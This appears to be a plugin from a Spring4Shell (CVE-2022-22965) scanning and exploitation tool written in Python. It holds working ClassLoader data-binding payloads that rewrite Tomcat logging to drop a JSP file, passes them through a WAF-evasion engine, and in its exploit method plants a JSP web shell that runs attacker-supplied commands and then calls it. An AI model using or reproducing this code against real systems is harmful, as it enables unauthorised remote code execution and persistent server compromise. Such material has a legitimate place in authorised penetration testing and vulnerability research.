"""
Plugin for CVE-2022-22965: Spring4Shell ClassLoader RCE.
"""

from __future__ import annotations

import urllib.parse
from typing import TYPE_CHECKING, Any

from spring2shell.core.reporter import build_finding
from spring2shell.evasion.waf_engine import waf_engine
from spring2shell.plugins.base import BasePlugin
from spring2shell.utils.auth import audit_log, rate_limit_acquire

if TYPE_CHECKING:
    import requests


class CVE_2022_22965_Plugin(BasePlugin):
    """Spring4Shell ClassLoader RCE (CVE-2022-22965) Plugin."""

    name = "cve_2022_22965"
    cve_id = "CVE-2022-22965"
    description = "Spring4Shell — ClassLoader data binding RCE"

    payload_templates = [
        "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcat-war&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=",
        "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%{cmd}i&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=shell&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=",
    ]

    def check(
        self,
        session: requests.Session,
        target: str,
        endpoint: str,
        headers: dict[str, str],
    ) -> dict[str, Any] | None:
        for payload in self.payload_templates:
            req_headers = headers.copy()
            req_headers["Content-Type"] = "application/x-www-form-urlencoded"
            # WAF evasion
            payload, req_headers = waf_engine.apply(payload, req_headers)

            try:
                rate_limit_acquire()
                resp = session.post(endpoint, data=payload, headers=req_headers, timeout=5)
                audit_log("POST", endpoint, resp.status_code, payload[:100], "cve_scan")

                # Spring4Shell ClassLoader change often returns 200/400 but changes server files.
                # A common passive verification is checking if the ClassLoader modification returns 200/400/500
                # without breaking connection, but direct RCE verification requires accessing the written JSP shell.
                # Here we just mark it as unverified/potential if the request succeeds with status 200/400.
                if resp.status_code in (200, 400):
                    return build_finding(
                        url=target,
                        endpoint=endpoint,
                        status="unverified",
                        cve=self.cve_id,
                        confidence="medium",
                        reason="CVE_2022_22965_POTENTIAL",
                        evidence="ClassLoader data binding modification request accepted by server.",
                        payload=payload,
                        method="POST",
                        status_code=resp.status_code,
                        framework="Spring Tomcat",
                    )
            except Exception:
                continue
        return None

    def exploit(
        self,
        session: requests.Session,
        target: str,
        endpoint: str,
        headers: dict[str, str],
        command: str,
    ) -> str | None:
        # Spring4Shell writes a JSP shell file to webapps/ROOT/tomcat-war.jsp
        # We trigger the payload to drop the shell, then request it.
        drop_payload = self.payload_templates[0]
        req_headers = headers.copy()
        req_headers["Content-Type"] = "application/x-www-form-urlencoded"
        req_headers["c2"] = '<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>'

        try:
            session.post(endpoint, data=drop_payload, headers=req_headers, timeout=5)
            # Try to query the written JSP file
            shell_url = urllib.parse.urljoin(target, "/tomcat-war.jsp")
            resp = session.get(shell_url, params={"cmd": command}, timeout=5)
            if resp.status_code == 200:
                return resp.text
        except Exception:
            pass
        return None
